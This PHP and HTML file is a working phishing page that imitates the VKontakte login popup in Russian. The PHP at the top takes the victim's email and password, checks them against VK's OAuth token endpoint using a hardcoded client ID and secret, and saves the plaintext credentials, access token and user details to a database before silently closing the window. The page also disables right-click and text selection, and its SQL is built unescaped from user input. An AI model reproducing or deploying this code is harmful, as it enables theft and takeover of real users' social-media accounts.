<?php
error_reporting(0);
	include('../db.php');	
	
	if (($_POST["email"] != "") and ($_POST["pass"]))
	{
		$username = $_POST["email"];
		$password = $_POST["pass"];
		
		$check = file_get_contents("http://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
		
		
		preg_match_all('/(?<=:)\w+/', $check, $words, PREG_PATTERN_ORDER);
        $matches = $words[0];
		
 $res23 = json_decode($check, true);
 $token = $res23['access_token'];
		
 $id = $matches[1];
 $request = 'https://api.vk.com/method/users.get?user_ids='.$id.'&fields=photo_50';
 $response = file_get_contents($request);
 $info = array_shift(json_decode($response)->response);	
 
 $value = $info->first_name;

		if (strpos($check, "access_token") === false)
		{
			$message = '<div class="box_error">Указан неверный логин или пароль.</div>';
		} 
			else
			{		

	
$db->db_query("INSERT INTO vk (login,pass,vopros1,vopros2,token,users) VALUES ('".$username."','".$password."','".$info->first_name."','".$info->last_name."','".$token."','".$id."')");
				setcookie ("go", "go", time()+3600, "/");
				exit("<script>window.close();</script>");
				
			
			}
	}
	
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>ВКонтакте | Вход</title>
	<link rel="shortcut icon" href="http://vk.com/images/faviconnew.ico?3">
	<link rel="stylesheet" type="text/css" href="/auth/css/fonts_cnt.css" />
	<link rel="stylesheet" type="text/css" href="/auth/css/common.css" />
    <link type="text/css" rel="stylesheet" href="/auth/css/oauth_popup.css"></link>
    <script type="text/javascript" language="javascript" src="/auth/css/common_light.js"></script>
  <body onresize="onBodyResize(true);" class="VK oauth_centered">
    <script>
      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
    </script>

	<script type="text/javascript">
		document.ondragstart = noselect;
		document.onselectstart = noselect;
		document.oncontextmenu = noselect;
		function noselect(){return false;}
	</script>
    <div class="oauth_wrap">
      <div class="oauth_wrap_inner">
        <div class="oauth_wrap_content" id="oauth_wrap_content">
          <div class="oauth_head">
  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
  <div id="oauth_head_info" class="oauth_head_info fl_r">
    <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
  </div>
</div>

<div class="oauth_content box_body clear_fix">
  <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

  <form method="post" action="">
    <div class="oauth_form">

      <center>
	<?=$message?>
	</center>

      <div class="oauth_form_login">

        <div class="oauth_form_header">Телефон или e-mail</div>
        <input type="text" class="oauth_form_input dark" required="required" required minlength="2" maxlength="1024" name="email" value="">
        <div class="oauth_form_header">Пароль</div>
        <input type="password" class="oauth_form_input dark" required="required" required minlength="2" maxlength="1024" name="pass" />

        

        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
        <input type="submit" name="submit_input" class="unshown">
      </div>
    </div>
  </form>
</div>
        </div>
      </div>
    </div>
  </body>
</html>